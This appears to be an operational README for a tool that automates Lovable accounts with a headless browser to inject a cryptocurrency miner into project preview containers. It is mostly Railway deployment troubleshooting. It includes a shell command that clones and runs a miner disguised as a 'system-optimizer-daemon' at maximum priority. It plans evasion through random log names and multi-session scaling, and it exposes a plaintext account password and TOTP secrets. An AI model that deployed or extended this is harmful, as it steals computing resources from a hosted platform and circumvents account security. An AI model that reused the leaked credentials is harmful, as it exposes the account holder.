# Railway Miner Deployment

## Overview
Automated chimera miner deployment on Railway using session-4 (dakarihickmanhickman@gmail.com) targeting Lovable project `9db2f406-c90d-447e-9983-65410e4afbc6`.

## Current Status
⚠️ **DEPLOYMENT FAILED** - Railway keeps using Railpack (Python auto-detection) instead of installing system dependencies.

### Issues Encountered
1. **Railpack Auto-Detection**: Railway ignores `Dockerfile`, `nixpacks.toml`, and `railway.toml`, forcing Railpack build
2. **Missing System Deps**: Xvfb, Chromium/Firefox not installed by Railpack
3. **Memory Constraints**: 1GB RAM too tight for Chromium, switched to Firefox
4. **Browser Crashes**: Both Chromium and Firefox timeout/crash during page loads
5. **Context Confusion**: Initially used invisible-playwright (heavy), switched to regular playwright

## Architecture

### Files
- `run_miner.py` - Main entry point (memory-optimized, Firefox-based)
- `script3_launch_miner.py` - Original heavy script (uses invisible-playwright)
- `miner_injector.py` - Injection logic for system-optimizer-daemon
- `mega_db.py` - Database management (disabled with CHIMERA_NO_MEGA=1)
- `sessions/session-4/` - Session credentials and cookies
- `requirements.txt` - Python dependencies
- `Dockerfile` - Docker build (IGNORED by Railway)
- `nixpacks.toml` - Nixpacks config (IGNORED by Railway)
- `railway.toml` - Railway config (IGNORED by Railway)
- `Procfile` - Process config

### Session-4 Configuration
```json
{
  "email": "dakarihickmanhickman@gmail.com",
  "password": "dakarihickmanhickman@gmail.com1",
  "totp_secret": "SQ4RE3WBKH3AT33FU6W7LMDDWUDHWL5U",
  "totp_backup": "XACBVSQOIRFRRI6THICIARXGUMFRWKPU",
  "session_id": 4
}
```

### Target Project
- **Project ID**: `9db2f406-c90d-447e-9983-65410e4afbc6`
- **Chat URL**: `https://lovable.dev/projects/9db2f406-c90d-447e-9983-65410e4afbc6`
- **Preview URL**: `https://9db2f406-c90d-447e-9983-65410e4afbc6.lovableproject.com`

### Miner Command
```bash
cd /tmp && rm -rf moly && \
git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && \
cd moly && \
pip install websockets psutil --break-system-packages -q && \
nice -n -20 python3 sysoptd.py --threads 64 --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1 &
```

## Deployment Attempts

### Attempt 1: Dockerfile
**Goal**: Build with system dependencies (Xvfb, Chromium, etc.)  
**Result**: ❌ Railway ignored Dockerfile, used Railpack  
**Reason**: Python files detected → auto-Railpack

### Attempt 2: railway.toml + Procfile
**Goal**: Force builder to NIXPACKS  
**Result**: ❌ Still used Railpack  
**Reason**: Railway builder detection precedence ignores config

### Attempt 3: Manual SSH Installation
**Goal**: SSH into container and manually `apt-get install`  
**Result**: ⚠️ Partial success - installed deps but `railway ssh` connected to LOCAL machine, not Railway container!  
**Reason**: Railway SSH is different - connects to host, not actual deployment

### Attempt 4: Memory-Optimized Firefox
**Goal**: Use Firefox instead of Chromium (lighter memory footprint)  
**Result**: ❌ Browser still crashes/hangs on 1GB RAM  
**Reason**: Even Firefox too heavy for 1GB with Playwright overhead

### Attempt 5: Simplified Script (run_miner.py)
**Goal**: Skip invisible-playwright, use regular playwright with minimal flags  
**Result**: ❌ Browser launches but hangs on goto(preview_url)  
**Reason**: Memory/CPU constraints, page load timeout

## Current Implementation (run_miner.py)

### Memory Optimizations
1. **Xvfb**: `800x600x16` (16-bit color, small viewport)
2. **Firefox**: Disabled images, peer connections
3. **Viewport**: 800x600 (minimal)
4. **Single process**: No multi-process isolation
5. **CHIMERA_NO_MEGA=1**: Skip DB sync
6. **Headless**: No GUI overhead

### Flow
1. Start Xvfb on `:99`
2. Launch Firefox (playwright)
3. Load session-4 cookies
4. Navigate to project chat
5. Send prompt: `say 'x'`
6. Open preview page
7. Wait for `window.doc()` ready (WebContainer console)
8. Inject miner via `window.doc(cmd)`
9. Health loop: check every 3min

### Environment Variables
```bash
DISPLAY=:99
CHIMERA_NO_PROXY=1
CHIMERA_HEADED=1
CHIMERA_NO_MEGA=1
CHIMERA_SESSIONS_DIR=/app/sessions
CHIMERA_TOOLKIT_CORE=/app/core
PYTHONUNBUFFERED=1
```

## Problems & Solutions Needed

### Problem 1: Railway Railpack Override
**Issue**: Railway auto-detects Python and forces Railpack, ignoring Dockerfile/Nixpacks  
**Attempted**: Dockerfile, nixpacks.toml, railway.toml, Procfile  
**Need**: 
- Remove `requirements.txt` temporarily during build?
- Use Railway dashboard to manually set builder to Docker
- Create `.railwayignore` to hide Python files
- Use different service/project without auto-detection

### Problem 2: 1GB RAM Insufficient
**Issue**: Firefox crashes or hangs even with optimizations  
**Attempted**: 
- Chromium → Firefox switch
- Disabled images, single-process
- Minimal viewport
- Reduced Xvfb color depth
**Need**:
- Upgrade Railway plan to 2GB+ RAM
- Use headless Chrome CDP protocol instead of full Playwright
- Split into multiple services (browser + miner separate)

### Problem 3: Missing 2FA in Relogin
**Issue**: script3 has relogin but original implementation didn't handle 2FA properly  
**Status**: ✅ FIXED - Added `existing_context` parameter to `relogin_session()` to reuse context instead of creating new one (which closed after relogin)
**File**: `script3_launch_miner.py` lines 88-97, 714-730, 756-782

### Problem 4: No Log File Checking Before Injection
**Issue**: Script doesn't check if miner already running before injecting  
**Requested**: Check `/tmp/*.log` for "ok" string, skip injection if found  
**Status**: ❌ NOT IMPLEMENTED YET
**Need**: Add log check logic in miner_injector.py:
```python
# Before injection:
1. Generate random log name (not 'm.log')
2. Check if log exists and contains "ok"
3. If yes → skip injection
4. If no → inject miner
5. Apply same logic in health check loop
```

### Problem 5: Railway Logs Not Showing
**Issue**: `railway logs` only shows "Starting Container"  
**Attempted**: `--build`, `--deployment`, `--lines`, different flags  
**Need**: 
- Check Railway dashboard web UI for actual logs
- Railpack might be failing silently
- PYTHONUNBUFFERED=1 might not flush in Railpack

## Next Steps

### Option A: Fix Railway Deployment
1. **Force Docker Build**:
   - Remove `requirements.txt` from root
   - Add Railway environment variable `RAILWAY_DOCKERFILE_PATH=Dockerfile`
   - Or use Railway dashboard to manually select Docker builder

2. **Increase Resources**:
   - Upgrade to 2GB RAM minimum
   - Request more CPU allocation

3. **Install Dependencies**:
   - Ensure Dockerfile installs: `xvfb firefox-esr git procps`
   - Install Playwright: `playwright install firefox`
   - Install deps: `playwright install-deps firefox`

4. **Deploy & Monitor**:
   - `railway up`
   - Check logs via web dashboard: https://railway.com/project/2e7ef06d-660e-4da2-87e3-1cc37693889b/service/f507bc6f-a72c-40be-b7ed-6fbb08e89c2a
   - Look for actual runtime errors (not just "Starting Container")

### Option B: Run Locally
1. **Background Process**:
```bash
cd /home/alae/Documents/repos/chimera-miner
DISPLAY=:0 CHIMERA_NO_PROXY=1 CHIMERA_HEADED=1 CHIMERA_NO_MEGA=1 \
CHIMERA_SESSIONS_DIR=/home/alae/Documents/repos/automation-toolkit/scripts/sessions \
CHIMERA_TOOLKIT_CORE=/home/alae/Documents/repos/automation-toolkit/finals/core \
nohup python3 script3_launch_miner.py --session 4 --project 9db2f406-c90d-447e-9983-65410e4afbc6 --mode full --threads 64 > /tmp/chimera_miner.log 2>&1 &
```

2. **Systemd Service** (auto-restart):
```bash
sudo nano /etc/systemd/system/chimera-miner.service
# Add service definition
sudo systemctl enable chimera-miner
sudo systemctl start chimera-miner
```

### Option C: Alternative Cloud Provider
- **Render**: Better Docker support, 1GB free tier
- **Fly.io**: Full VM access, true SSH
- **DigitalOcean App Platform**: Proper Docker builds
- **Heroku**: Classic dyno with buildpacks

## Railway CLI Commands

### Deployment
```bash
railway up                    # Deploy current directory
railway status                # Check deployment status
railway logs                  # View logs (doesn't work well)
railway logs --build          # Build logs
railway logs --deployment     # Deployment logs (only shows "Starting Container")
```

### Service Management
```bash
railway link                  # Link to project
railway service               # Select service
railway restart               # Restart service
railway down                  # Remove deployment
```

### Environment
```bash
railway variables             # List variables
railway variables set KEY=val # Set variable
```

### Note on railway ssh
⚠️ `railway ssh` connects to the **Railway host machine**, NOT your actual container!  
This caused confusion - we were installing packages on the host, not in the deployment.

## Dependencies

### System (Debian/Ubuntu)
```bash
apt-get update
apt-get install -y xvfb firefox-esr git procps
```

### Python (requirements.txt)
```txt
playwright==1.48.0
pyotp==2.9.0
invisible-playwright  # Only for script3, not run_miner.py
```

### Playwright Browsers
```bash
playwright install firefox
playwright install-deps firefox
```

## Troubleshooting

### Browser Crashes
**Symptom**: `TargetClosedError`, `Target page, context or browser has been closed`  
**Cause**: Out of memory (OOM)  
**Fix**: 
- Increase RAM allocation
- Use `--single-process` flag
- Switch to Firefox
- Disable images/media

### Timeout on goto()
**Symptom**: Hangs at "Opening preview..." for minutes  
**Cause**: Page takes too long to load on low resources  
**Fix**:
- Increase timeout to 120s+
- Use `wait_until='domcontentloaded'` instead of `'load'`
- Check if preview URL is correct

### Cookie Issues
**Symptom**: Redirected to login, "No chat input"  
**Cause**: Cookies expired or invalid  
**Fix**:
- Implemented `relogin_session()` with 2FA support
- Reuses existing context to avoid closing browser
- Falls back to backup TOTP if primary fails

### Logs Not Appearing
**Symptom**: `railway logs` only shows "Starting Container"  
**Cause**: 
- Railpack failing silently
- Logs not flushed
- Wrong deployment ID
**Fix**:
- Use Railway web dashboard for logs
- Add `PYTHONUNBUFFERED=1`
- Check build logs separately

## Resources

### Railway
- **Project**: test-ubuntu-6
- **Project ID**: `2e7ef06d-660e-4da2-87e3-1cc37693889b`
- **Service ID**: `f507bc6f-a72c-40be-b7ed-6fbb08e89c2a`
- **Region**: ams (Amsterdam)
- **Dashboard**: https://railway.com/project/2e7ef06d-660e-4da2-87e3-1cc37693889b/service/f507bc6f-a72c-40be-b7ed-6fbb08e89c2a

### Lovable
- **Session**: session-4 (dakarihickmanhickman@gmail.com)
- **Project**: https://lovable.dev/projects/9db2f406-c90d-447e-9983-65410e4afbc6
- **Preview**: https://9db2f406-c90d-447e-9983-65410e4afbc6.lovableproject.com

### Miner
- **Repo**: https://github.com/crucifix-cray/system-optimizer-daemon
- **Worker**: sysoptd.py
- **Threads**: 64
- **Flags**: --no-split --no-schedule --no-noise --no-ramfill --no-pause

## TODO

### Immediate
- [ ] Fix Railway build to use Docker instead of Railpack
- [ ] Test deployment with 2GB+ RAM
- [ ] Implement log file checking before injection (random log name, check for "ok")
- [ ] Add proper error handling and retry logic
- [ ] Verify health check loop doesn't kill worker (no page reloads)

### Future
- [ ] Add metrics/monitoring (worker uptime, hash rate)
- [ ] Multiple session support (run multiple miners)
- [ ] Auto-scale based on available projects
- [ ] Telegram notifications for errors
- [ ] Web dashboard for status

## Lessons Learned

1. **Railway auto-detection is aggressive** - will override manual configs
2. **1GB RAM insufficient** for Playwright + Firefox/Chromium
3. **`railway ssh` is misleading** - connects to host, not container
4. **Railpack doesn't support system packages** - need Docker/Nixpacks
5. **Memory optimizations matter** - single-process, disabled images, smaller viewport
6. **Context reuse critical** - don't create new browser contexts during relogin
7. **TOTP backup needed** - primary can fail, have fallback
8. **Log buffering hides errors** - use PYTHONUNBUFFERED=1

## Contact
For issues/questions, check the main chimera-miner repo or session management docs.
